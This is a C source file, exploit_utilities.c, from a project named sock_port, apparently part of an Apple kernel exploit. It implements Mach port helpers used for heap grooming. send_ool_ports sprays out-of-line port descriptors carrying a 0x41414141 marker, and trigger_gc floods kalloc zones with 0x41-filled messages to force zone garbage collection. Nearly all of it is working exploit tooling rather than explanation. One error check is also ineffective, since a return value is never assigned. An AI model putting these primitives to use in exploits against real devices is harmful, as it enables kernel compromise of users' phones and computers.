//
//  exploit_utilities.c
//  sock_port
//
//  Created by Jake James on 7/17/19.
//  Copyright © 2019 Jake James. All rights reserved.
//

#import "tw_utilities.h"
#include "common.h"

mach_port_t new_mach_port() {
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (ret) {
        RAWLOG("[-] failed to allocate port");
        return MACH_PORT_NULL;
    }
    
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (ret) {
        RAWLOG("[-] failed to insert right");
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    
    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    ret = mach_port_set_attributes(mach_task_self(), port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT);
    if (ret) {
        RAWLOG("[-] failed to increase queue limit");
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    
    return port;
}


kern_return_t send_message(mach_port_t destination, void *buffer, mach_msg_size_t size) {
    mach_msg_size_t msg_size = sizeof(struct simple_msg) + size;
    struct simple_msg *msg = malloc(msg_size);
    
    memset(msg, 0, sizeof(struct simple_msg));
    
    msg->hdr.msgh_remote_port = destination;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = msg_size;
    
    memcpy(&msg->buf[0], buffer, size);
    
    kern_return_t ret = mach_msg(&msg->hdr, MACH_SEND_MSG, msg_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret) {
        RAWLOG("[-] failed to send message");
        mach_port_destroy(mach_task_self(), destination);
        free(msg);
        return ret;
    }
    free(msg);
    return KERN_SUCCESS;
}

struct simple_msg* receive_message(mach_port_t source, mach_msg_size_t size) {
    mach_msg_size_t msg_size = sizeof(struct simple_msg) + size;
    struct simple_msg *msg = malloc(msg_size);
    memset(msg, 0, sizeof(struct simple_msg));
 
    kern_return_t ret = mach_msg(&msg->hdr, MACH_RCV_MSG, 0, msg_size, source, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret) {
        RAWLOG("[-] failed to receive message");
        return NULL;
    }
    
    return msg;
}

int send_ool_ports(mach_port_t where, mach_port_t target_port, int count, int disposition) {
    kern_return_t ret;
    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }
    
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = where;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    ret = mach_msg(&msg->hdr, MACH_SEND_MSG|MACH_MSG_OPTION_NONE, msg->hdr.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    
    free(msg);
    free(ports);
    
    if (ret) {
        RAWLOG("[-] Failed to send OOL message: 0x%x (%s)", ret, mach_error_string(ret));
        return KERN_FAILURE;
    }
    
    return 0;
}

void trigger_gc() {
    const int gc_ports_cnt = 1000;
    int gc_ports_max = gc_ports_cnt;
    mach_port_t gc_ports[gc_ports_cnt] = { 0 };
    
    uint32_t body_size = (uint32_t)message_size_for_kalloc_size(16384) - sizeof(struct simple_msg); // 1024
    uint8_t *body = (uint8_t*)malloc(body_size);
    memset(body, 0x41, body_size);
    
    for (int i = 0; i < gc_ports_cnt; i++) {
        uint64_t t0, t1;
        
        t0 = mach_absolute_time();
        
        gc_ports[i] = new_mach_port();
        send_message(gc_ports[i], body, body_size);
        
        t1 = mach_absolute_time();
        
        if (t1 - t0 > 1000000) {
            RAWLOG("[+] got gc at %d -- breaking", i);
            gc_ports_max = i;
            break;
        }
    }
    
    for (int i = 0; i < gc_ports_max; i++) {
        mach_port_destroy(mach_task_self(), gc_ports[i]);
    }
    
    sched_yield();
    sleep(1);
}

